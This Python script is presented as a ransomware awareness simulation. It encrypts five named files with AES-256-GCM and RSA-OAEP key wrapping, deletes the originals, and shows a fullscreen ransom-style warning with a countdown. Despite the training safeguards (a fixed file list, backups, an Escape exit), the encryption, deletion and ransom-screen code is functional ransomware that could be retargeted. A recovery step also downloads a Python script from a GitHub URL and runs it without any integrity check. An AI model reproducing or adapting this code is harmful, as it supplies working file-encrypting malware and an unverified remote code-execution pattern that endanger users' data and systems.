from pathlib import Path
from datetime import datetime, timedelta

import hashlib
import json
import os
import shutil
import subprocess
import sys
import tkinter as tk
import time

from urllib.request import Request, urlopen

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes


# ============================================================
# CONTROLLED RANSOMWARE AWARENESS LAB
#
# ONLY these explicitly listed training files are processed:
#
# ~/Desktop/RansomDemo/targets/
#
# No recursive filesystem scanning is performed.
# ============================================================


ROOT = (
    Path.home()
    / "Desktop"
    / "RansomDemo"
)

TARGET_DIR = (
    ROOT
    / "targets"
)

BACKUP_DIR = (
    ROOT
    / ".safety_backup"
)

RUNTIME_DIR = (
    ROOT
    / ".runtime"
)

LOG_FILE = (
    ROOT
    / "demo_log.txt"
)

CHECKSUM_FILE = (
    ROOT
    / "checksums.json"
)

PRIVATE_KEY_FILE = (
    RUNTIME_DIR
    / "private.pem"
)

PUBLIC_KEY_FILE = (
    RUNTIME_DIR
    / "public.pem"
)

DECRYPTOR_FILE = (
    RUNTIME_DIR
    / "demo_decrypt.py"
)


# ============================================================
# GITHUB
# ============================================================


DECRYPTOR_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/demo_decrypt.py"
)


RECOVERY_CODE_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/recovery_code.txt"
)


# ============================================================
# TRAINING TARGET FILES
# ============================================================


TARGET_FILES = [
    "personal_notes.txt",
    "employees.csv",
    "config.json",
    "project_plan.md",
    "application.log",
]


MAGIC = b"UNTDEMO1"

COUNTDOWN_MINUTES = 30


# ============================================================
# LOGGING
# ============================================================


def write_log(message):

    ROOT.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )

    line = (
        f"{timestamp} "
        f"{message}"
    )

    print(line)

    with LOG_FILE.open(
        "a",
        encoding="utf-8"
    ) as file:

        file.write(
            line + "\n"
        )


# ============================================================
# SHA-256
# ============================================================


def sha256_file(path):

    digest = hashlib.sha256()

    with path.open(
        "rb"
    ) as file:

        while True:

            chunk = file.read(
                1024 * 1024
            )

            if not chunk:
                break

            digest.update(
                chunk
            )

    return digest.hexdigest()


# ============================================================
# DIRECTORIES
# ============================================================


def setup():

    TARGET_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    BACKUP_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    RUNTIME_DIR.mkdir(
        parents=True,
        exist_ok=True
    )


# ============================================================
# RSA KEY GENERATION
# ============================================================


def generate_keys():

    if PRIVATE_KEY_FILE.exists():

        private_key = RSA.import_key(
            PRIVATE_KEY_FILE.read_bytes()
        )

        if not PUBLIC_KEY_FILE.exists():

            PUBLIC_KEY_FILE.write_bytes(
                private_key
                .publickey()
                .export_key()
            )

        write_log(
            "[KEY] Existing RSA key pair loaded"
        )

        return


    write_log(
        "[KEY] Generating RSA-2048 training key pair"
    )


    key = RSA.generate(
        2048
    )


    PRIVATE_KEY_FILE.write_bytes(
        key.export_key()
    )


    PUBLIC_KEY_FILE.write_bytes(
        key
        .publickey()
        .export_key()
    )


    try:

        os.chmod(
            PRIVATE_KEY_FILE,
            0o600
        )

    except OSError:

        pass


    write_log(
        "[KEY] RSA key pair generated"
    )


# ============================================================
# ORIGINAL SHA-256 BASELINE
# ============================================================


def save_original_checksums():

    checksums = {}


    for filename in TARGET_FILES:

        path = (
            TARGET_DIR
            / filename
        )


        if not path.exists():

            write_log(
                "[HASH-ERROR] "
                f"Missing source file: {filename}"
            )

            continue


        if path.is_symlink():

            write_log(
                "[HASH-ERROR] "
                f"Symlink rejected: {filename}"
            )

            continue


        digest = sha256_file(
            path
        )


        checksums[
            filename
        ] = digest


        write_log(
            "[HASH-BEFORE] "
            f"{filename} "
            f"{digest}"
        )


    CHECKSUM_FILE.write_text(
        json.dumps(
            checksums,
            indent=2
        ),
        encoding="utf-8"
    )


    write_log(
        "[HASH] SHA-256 baseline saved"
    )


# ============================================================
# ENCRYPT ONE TRAINING FILE
# ============================================================


def encrypt_file(filename):

    source = (
        TARGET_DIR
        / filename
    )

    encrypted = (
        TARGET_DIR
        / (filename + ".unt")
    )

    backup = (
        BACKUP_DIR
        / filename
    )

    temporary = (
        TARGET_DIR
        / (filename + ".unt.tmp")
    )


    # --------------------------------------------------------
    # SAFETY CHECKS
    # --------------------------------------------------------


    if source.is_symlink():

        write_log(
            "[SKIP] "
            f"Symlink rejected: {filename}"
        )

        return False


    if not source.exists():

        if encrypted.exists():

            write_log(
                "[INFO] "
                f"Already encrypted: {filename}"
            )

            return True


        write_log(
            "[ERROR] "
            f"Source file missing: {filename}"
        )

        return False


    if encrypted.exists():

        write_log(
            "[ERROR] "
            f"Both plaintext and encrypted "
            f"file exist: {filename}"
        )

        return False


    # --------------------------------------------------------
    # SAFETY BACKUP
    # --------------------------------------------------------


    if not backup.exists():

        shutil.copy2(
            source,
            backup
        )

        write_log(
            "[BACKUP] "
            f"{filename}"
        )


    # --------------------------------------------------------
    # READ ORIGINAL DATA
    # --------------------------------------------------------


    plaintext = (
        source.read_bytes()
    )


    # --------------------------------------------------------
    # RSA PUBLIC KEY
    # --------------------------------------------------------


    public_key = RSA.import_key(
        PUBLIC_KEY_FILE.read_bytes()
    )


    # --------------------------------------------------------
    # AES-256 RANDOM KEY
    # --------------------------------------------------------


    aes_key = get_random_bytes(
        32
    )


    # --------------------------------------------------------
    # AES-256-GCM
    # --------------------------------------------------------


    aes_cipher = AES.new(
        aes_key,
        AES.MODE_GCM
    )


    ciphertext, tag = (
        aes_cipher.encrypt_and_digest(
            plaintext
        )
    )


    # --------------------------------------------------------
    # RSA-OAEP WRAP AES KEY
    # --------------------------------------------------------


    rsa_cipher = PKCS1_OAEP.new(
        public_key,
        hashAlgo=SHA256
    )


    encrypted_aes_key = (
        rsa_cipher.encrypt(
            aes_key
        )
    )


    try:

        # ----------------------------------------------------
        # BUILD .UNT FILE
        # ----------------------------------------------------

        with temporary.open(
            "wb"
        ) as file:


            # MAGIC
            file.write(
                MAGIC
            )


            # RSA-WRAPPED AES KEY LENGTH
            file.write(
                len(
                    encrypted_aes_key
                ).to_bytes(
                    2,
                    "big"
                )
            )


            # RSA-WRAPPED AES KEY
            file.write(
                encrypted_aes_key
            )


            # NONCE LENGTH
            file.write(
                len(
                    aes_cipher.nonce
                ).to_bytes(
                    1,
                    "big"
                )
            )


            # NONCE
            file.write(
                aes_cipher.nonce
            )


            # GCM TAG LENGTH
            file.write(
                len(tag).to_bytes(
                    1,
                    "big"
                )
            )


            # GCM TAG
            file.write(
                tag
            )


            # CIPHERTEXT
            file.write(
                ciphertext
            )


        # ----------------------------------------------------
        # FINALIZE
        # ----------------------------------------------------


        os.replace(
            temporary,
            encrypted
        )


        # Plaintext disappears only after
        # encrypted output has been created.
        source.unlink()


        write_log(
            "[ENCRYPTED] "
            f"{filename} -> "
            f"{filename}.unt"
        )


        return True


    except Exception as error:


        if temporary.exists():

            temporary.unlink()


        write_log(
            "[ENCRYPT-FAILED] "
            f"{filename}: "
            f"{error}"
        )


        return False


# ============================================================
# ENCRYPT ALL FIVE
# ============================================================


def encrypt_all():

    successful = 0


    for filename in TARGET_FILES:

        if encrypt_file(
            filename
        ):

            successful += 1


    return successful


# ============================================================
# VERIFY ENCRYPTED STATE
# ============================================================


def verify_encrypted_state():

    for filename in TARGET_FILES:

        original = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )


        if original.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Plaintext remains: "
                f"{filename}"
            )

            return False


        if not encrypted.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Encrypted file missing: "
                f"{filename}.unt"
            )

            return False


    write_log(
        "[VERIFY] "
        "All 5 training files encrypted"
    )


    return True


# ============================================================
# GET REMOTE RECOVERY CODE
# ============================================================


def get_remote_recovery_code():

    # Cache-busting value ensures the current
    # GitHub file is requested each time.

    url = (
        RECOVERY_CODE_URL
        + "?t="
        + str(
            int(
                time.time()
            )
        )
    )


    request = Request(
        url,
        headers={
            "User-Agent":
                "Security-Awareness-Lab/1.0",

            "Cache-Control":
                "no-cache",

            "Pragma":
                "no-cache",
        }
    )


    with urlopen(
        request,
        timeout=10
    ) as response:

        raw = response.read()


    code = (
        raw
        .decode(
            "utf-8"
        )
        .strip()
    )


    if not code:

        raise RuntimeError(
            "Remote recovery code is empty"
        )


    if len(code) > 64:

        raise RuntimeError(
            "Remote recovery code is invalid"
        )


    write_log(
        "[RECOVERY] "
        "Remote recovery code retrieved"
    )


    return code


# ============================================================
# DOWNLOAD DECRYPTION PROGRAM
# ============================================================


def download_decryptor():

    write_log(
        "[RECOVERY] "
        "Downloading recovery utility"
    )


    url = (
        DECRYPTOR_URL
        + "?t="
        + str(
            int(
                time.time()
            )
        )
    )


    request = Request(
        url,
        headers={
            "User-Agent":
                "Security-Awareness-Lab/1.0",

            "Cache-Control":
                "no-cache",

            "Pragma":
                "no-cache",
        }
    )


    with urlopen(
        request,
        timeout=15
    ) as response:

        data = response.read()


    if len(data) < 100:

        raise RuntimeError(
            "Downloaded recovery utility "
            "is unexpectedly small"
        )


    temporary = (
        RUNTIME_DIR
        / "demo_decrypt.py.tmp"
    )


    temporary.write_bytes(
        data
    )


    os.replace(
        temporary,
        DECRYPTOR_FILE
    )


    write_log(
        "[RECOVERY] "
        "Recovery utility downloaded"
    )


# ============================================================
# WARNING GUI
# ============================================================


def show_warning_window():

    root = tk.Tk()


    root.title(
        "Ransomware Simulation"
    )


    root.configure(
        bg="#8b0000"
    )


    root.attributes(
        "-fullscreen",
        True
    )


    root.attributes(
        "-topmost",
        True
    )


    # Emergency exit for training.
    root.bind(
        "<Escape>",
        lambda event:
            root.destroy()
    )


    end_time = (
        datetime.now()
        + timedelta(
            minutes=COUNTDOWN_MINUTES
        )
    )


    # ========================================================
    # MAIN TITLE
    # ========================================================


    title = tk.Label(
        root,
        text="RANSOMWARE INFECTION",
        font=(
            "Arial",
            42,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )


    title.pack(
        pady=(65, 15)
    )


    # ========================================================
    # ENCRYPTED MESSAGE
    # ========================================================


    encrypted_message = tk.Label(
        root,
        text="YOUR FILES HAVE BEEN ENCRYPTED",
        font=(
            "Arial",
            24,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )


    encrypted_message.pack(
        pady=5
    )


    # ========================================================
    # TEST NOTICE
    # ========================================================


    test_notice = tk.Label(
        root,
        text="THIS IS A TEST.",
        font=(
            "Arial",
            14
        ),
        fg="white",
        bg="#8b0000"
    )


    test_notice.pack(
        pady=(5, 25)
    )


    # ========================================================
    # COUNTDOWN
    # ========================================================


    timer_label = tk.Label(
        root,
        text="00:30:00",
        font=(
            "Courier",
            50,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )


    timer_label.pack(
        pady=(10, 20)
    )


    # ========================================================
    # VIEW ENCRYPTED FILES
    # ========================================================


    def view_files():

        write_log(
            "[GUI] "
            "Encrypted files directory opened"
        )


        root.attributes(
            "-topmost",
            False
        )


        try:

            subprocess.Popen(
                [
                    "xdg-open",
                    str(
                        TARGET_DIR
                    )
                ]
            )


        except Exception as error:

            write_log(
                "[GUI-ERROR] "
                f"{error}"
            )


    view_button = tk.Button(
        root,
        text="VIEW ENCRYPTED FILES",
        font=(
            "Arial",
            14,
            "bold"
        ),
        command=view_files,
        padx=20,
        pady=6
    )


    view_button.pack(
        pady=8
    )


    # ========================================================
    # RECOVERY CODE
    # ========================================================


    code_label = tk.Label(
        root,
        text="RECOVERY CODE",
        font=(
            "Arial",
            14,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )


    code_label.pack(
        pady=(8, 3)
    )


    code_entry = tk.Entry(
        root,
        font=(
            "Arial",
            20
        ),
        width=18,
        justify="center",
        show="*"
    )


    code_entry.pack(
        pady=4
    )


    code_entry.focus_set()


    status_label = tk.Label(
        root,
        text="",
        font=(
            "Arial",
            13,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )


    status_label.pack(
        pady=6
    )


    # ========================================================
    # RECOVERY PROCESS
    # ========================================================


    def recover():

        entered_code = (
            code_entry
            .get()
            .strip()
        )


        if not entered_code:

            status_label.config(
                text="ENTER A RECOVERY CODE"
            )

            return


        status_label.config(
            text="VALIDATING RECOVERY CODE..."
        )


        root.update_idletasks()


        write_log(
            "[RECOVERY] "
            "Recovery code validation requested"
        )


        # ----------------------------------------------------
        # GET CURRENT RECOVERY CODE FROM GITHUB
        # ----------------------------------------------------


        try:

            remote_code = (
                get_remote_recovery_code()
            )


        except Exception as error:

            write_log(
                "[RECOVERY-ERROR] "
                "Unable to retrieve remote code: "
                f"{error}"
            )


            status_label.config(
                text=(
                    "UNABLE TO CONTACT "
                    "RECOVERY SERVER"
                )
            )


            return


        # ----------------------------------------------------
        # COMPARE INPUT WITH REMOTE CODE
        # ----------------------------------------------------


        if entered_code != remote_code:


            write_log(
                "[RECOVERY] "
                "Invalid recovery code entered"
            )


            status_label.config(
                text="INVALID RECOVERY CODE"
            )


            code_entry.delete(
                0,
                tk.END
            )


            return


        # ----------------------------------------------------
        # VALID
        # ----------------------------------------------------


        write_log(
            "[RECOVERY] "
            "Remote recovery code validated"
        )


        status_label.config(
            text="RECOVERY CODE ACCEPTED"
        )


        root.update_idletasks()


        # ----------------------------------------------------
        # DOWNLOAD DECRYPTOR
        # ----------------------------------------------------


        try:

            status_label.config(
                text=(
                    "DOWNLOADING "
                    "RECOVERY UTILITY..."
                )
            )


            root.update_idletasks()


            download_decryptor()


            status_label.config(
                text=(
                    "STARTING FILE RECOVERY..."
                )
            )


            root.update_idletasks()


            # ------------------------------------------------
            # START DECRYPTOR
            # ------------------------------------------------


            subprocess.Popen(
                [
                    sys.executable,
                    str(
                        DECRYPTOR_FILE
                    )
                ]
            )


            write_log(
                "[RECOVERY] "
                "Recovery utility launched"
            )


            root.destroy()


        except Exception as error:


            write_log(
                "[RECOVERY-ERROR] "
                f"{error}"
            )


            status_label.config(
                text=(
                    "RECOVERY FAILED: "
                    + str(error)
                )
            )


    # ========================================================
    # RECOVER BUTTON
    # ========================================================


    recover_button = tk.Button(
        root,
        text="RECOVER FILES",
        font=(
            "Arial",
            16,
            "bold"
        ),
        command=recover,
        padx=25,
        pady=7
    )


    recover_button.pack(
        pady=7
    )


    # ENTER also submits the recovery code.
    code_entry.bind(
        "<Return>",
        lambda event:
            recover()
    )


    # ========================================================
    # FOOTER
    # ========================================================


    footer = tk.Label(
        root,
        text=(
            "SIMULATION ONLY"
            "  •  "
            "ESC = Emergency Exit"
        ),
        font=(
            "Arial",
            12
        ),
        fg="white",
        bg="#8b0000"
    )


    footer.pack(
        side="bottom",
        pady=18
    )


    # ========================================================
    # COUNTDOWN LOGIC
    # ========================================================


    def update_timer():

        remaining = (
            end_time
            - datetime.now()
        )


        seconds = max(
            0,
            int(
                remaining.total_seconds()
            )
        )


        hours = (
            seconds // 3600
        )


        minutes = (
            seconds % 3600
        ) // 60


        seconds_remaining = (
            seconds % 60
        )


        timer_label.config(
            text=(
                f"{hours:02d}:"
                f"{minutes:02d}:"
                f"{seconds_remaining:02d}"
            )
        )


        if seconds > 0:

            root.after(
                1000,
                update_timer
            )


        else:

            status_label.config(
                text="TRAINING TIMER EXPIRED"
            )


            write_log(
                "[GUI] "
                "Training countdown expired"
            )


    update_timer()


    write_log(
        "[GUI] "
        "Warning screen displayed"
    )


    root.mainloop()


# ============================================================
# MAIN
# ============================================================


def main():

    setup()


    write_log(
        "=================================================="
    )


    write_log(
        "[START] "
        "Ransomware awareness simulation started"
    )


    # --------------------------------------------------------
    # CHECK REQUIRED TRAINING FILES
    # --------------------------------------------------------


    missing = []


    for filename in TARGET_FILES:

        plaintext = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )


        if (
            not plaintext.exists()
            and
            not encrypted.exists()
        ):

            missing.append(
                filename
            )


    if missing:


        write_log(
            "[ABORT] "
            "Required training files missing: "
            + ", ".join(
                missing
            )
        )


        print()

        print(
            "Required demo files are missing:"
        )


        for filename in missing:

            print(
                f" - {filename}"
            )


        return


    # --------------------------------------------------------
    # RSA
    # --------------------------------------------------------


    generate_keys()


    # --------------------------------------------------------
    # SAVE SHA-256 BASELINE
    #
    # Only save a new baseline when plaintext files exist.
    # --------------------------------------------------------


    plaintext_count = sum(

        1

        for filename
        in TARGET_FILES

        if (
            TARGET_DIR
            / filename
        ).exists()

    )


    if plaintext_count > 0:

        save_original_checksums()


    # --------------------------------------------------------
    # ENCRYPT
    # --------------------------------------------------------


    successful = (
        encrypt_all()
    )


    write_log(
        "[STATUS] "
        f"Encryption status: "
        f"{successful}/"
        f"{len(TARGET_FILES)}"
    )


    # --------------------------------------------------------
    # VERIFY ENCRYPTION
    # --------------------------------------------------------


    if not verify_encrypted_state():


        write_log(
            "[ABORT] "
            "Encrypted state verification failed"
        )


        print()

        print(
            "Not all training files "
            "were encrypted."
        )


        print(
            "Warning GUI will not "
            "be displayed."
        )


        return


    # --------------------------------------------------------
    # DISPLAY WARNING SCREEN
    # --------------------------------------------------------


    show_warning_window()


if __name__ == "__main__":

    main()
